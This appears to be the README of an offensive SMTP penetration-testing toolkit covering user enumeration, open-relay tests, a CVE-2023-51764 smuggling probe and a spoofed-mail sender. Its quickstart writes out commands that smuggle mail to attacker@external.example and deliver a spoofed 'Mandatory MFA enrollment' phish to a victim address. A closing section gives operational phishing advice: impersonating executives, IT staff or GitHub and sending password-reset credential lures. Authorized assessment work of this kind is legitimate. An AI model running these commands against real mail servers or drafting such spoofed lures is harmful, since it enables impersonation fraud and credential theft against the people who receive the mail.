# SMTP Toolkit

Authorized testing only. Five focused tools for SMTP enumeration, exploitation, and spoofing assessment.

## Files

```
standalones/smtp/
├── _smtp_lib.sh             # CRLF-correct dialog builder + parsing
├── smtp-quickwin.sh         # detection + tier classification
├── smtp-user-enum.sh        # VRFY/EXPN/RCPT user enumeration (timing-aware)
├── smtp-relay-test.sh       # 19 classical open-relay variations
├── smtp-phish-send.sh       # spoofed-mail sender with full header control
├── smtp-smuggling-test.py   # CVE-2023-51764 SMTP smuggling probe
└── spf-dmarc-check.sh       # domain authentication posture analysis
```

## Quickstart

```bash
# 1. Detect
./smtp-quickwin.sh --target mail.corp:25
./smtp-quickwin.sh --targets ../../outputs/acme/raw/_targets_smtp.txt -o out

# 2. The domain's email-auth posture (no server access needed — just DNS)
./spf-dmarc-check.sh corp.local

# 3. User enumeration
./smtp-user-enum.sh --target mail.corp:25 \\
    --users /usr/share/seclists/Usernames/Names/names.txt \\
    --domain corp.local --method auto -o found-users.txt

# 4. Open-relay variations (19 classic test cases)
./smtp-relay-test.sh --target mail.corp:25 --internal-domain corp.local

# 5. SMTP smuggling — DRY-RUN by default; add --send to actually transmit DATA payloads.
./smtp-smuggling-test.py --target mail.corp:25 \\
    --rcpt-to postmaster@corp.local \\
    --smuggle-from ceo@corp.local \\
    --smuggle-to attacker@external.example \\
    --variant all \\
    --send

# 6. Send a spoofed phish (after confirming relay/internal-relay is open).
#    DRY-RUN by default; add --send to actually deliver.
./smtp-phish-send.sh --target mail.corp:25 \\
    --from 'security@corp.local' --from-name 'IT Security' \\
    --to 'victim@corp.local' \\
    --subject 'Mandatory MFA enrollment' \\
    --html --body-file phish-email.html \\
    --send
```

## Exploitability Tier (`smtp-quickwin.sh`)

| Condition | Tier | Tooling |
|---|---|---|
| Open relay accepted external→external | **CRITICAL** | `smtp-phish-send.sh` for spoofed external delivery |
| Internal relay accepted unauth | **CRITICAL** | `smtp-phish-send.sh` for inside-the-perimeter phish (bypasses external DMARC) |
| Banner contains Exim ≤ 4.91 | **CRITICAL** | CVE-2019-10149 / CVE-2019-15846 — pre-auth RCE |
| VRFY or EXPN enabled | HIGH | `smtp-user-enum.sh` |
| No STARTTLS | MEDIUM | Passive auth-credential capture if MITM |
| Standard, no primitives | LOW | — |

## SPF/DMARC verdict (`spf-dmarc-check.sh`)

The check classifies a domain by what external attackers can do:

| Posture | Result |
|---|---|
| No SPF AND no DMARC | **DOMAIN IS WIDE OPEN** — trivially spoofable externally |
| DMARC `p=none` | **Weakly defended** — receivers receive reports but don't block |
| SPF `~all` + DMARC `p=quarantine` | Partial — mail lands in spam |
| SPF `-all` + DMARC `p=reject` | Well-defended — external spoofing requires bypassing both |
| SPF `+all` | **TRIVIAL** — anyone can pass SPF |

Domains with high MX traffic but missing DMARC reject are bread-and-butter phishing infrastructure.

## SMTP Smuggling (CVE-2023-51764 family)

Parser disagreement between inbound MTA (accepts `\n.\n` as end-of-data) and outbound (emits `\r\n.\r\n`) lets a second message slip into the same SMTP session, looking to the outbound like it originated **internally** — bypassing DMARC/SPF for the target domain.

`smtp-smuggling-test.py --variant all` rotates through five boundary bytes-mixtures. A vulnerable server accepts both the outer AND smuggled message; you confirm by checking the destination mailbox (which YOU control — set `--smuggle-to attacker@you.example`).

Patched in Postfix 3.8.5+, Exim 4.97+, Sendmail 8.18+. Many enterprise gateways (Cisco/Barracuda) shipped patches late.

## Open-Relay Variations Tested

The 19 classical tests cover:

1. Canonical `<external@external>`
2. Bare `external@external` (no brackets)
3. Multiple RCPT TO chains
4–5. Percent-encoded routing `user%domain@relay`
6–7. Multi-domain `user@a@b`
8. Quoted forms `"user@domain"@relay`
9. Source routing `<@relay:user@domain>`
10–11. Bang paths (`relay!user@domain`) — legacy UUCP, still parsed by some
12. Plus-tags `user+spam@domain`
13. Postmaster envelope-from
14. Empty envelope-from (`<>`)
15. Whitespace-trick `external domain`
16. Empty RCPT
17. Internal → external (sender is local domain)
18. External → internal (typical relay attack)
19. Unqualified RCPT (`<user>`)

A "well-configured" server rejects ALL except #17 (internal → external should work for legitimate users — that's why authentication is the only effective defense).

## When you actually have a working relay

- **Internal phish**: spoof finance@corp / it@corp / ceo@corp to staff. Bypasses external DMARC entirely because the inbound MTA sees the sender as already-inside-the-perimeter. High click-through because Outlook shows the spoofed name without warning.
- **Spoof external services that the target trusts**: spoofed `notifications@github.com` triggers fewer reflexive-skeptic responses than a random domain.
- **Credential phishing**: a "Password expires in 24h — reset here" mail from `it-support@corp.local` is bread and butter.

For Outlook header-injection (`X-Headers` bypassing some MFP checks), see Microsoft KB DMARC bypass via `Sender:` header tricks.

## Required tools

| Tool | Required for |
|---|---|
| `nc` / `ncat` | every script (the dialog transport) |
| `dig` | spf-dmarc-check.sh |
| `openssl` | smtp-quickwin (STARTTLS cert) |
| `python3` | smtp-smuggling-test.py |
| `swaks` | smtp-phish-send.sh `--tls` / `--auth-*` modes (optional) |
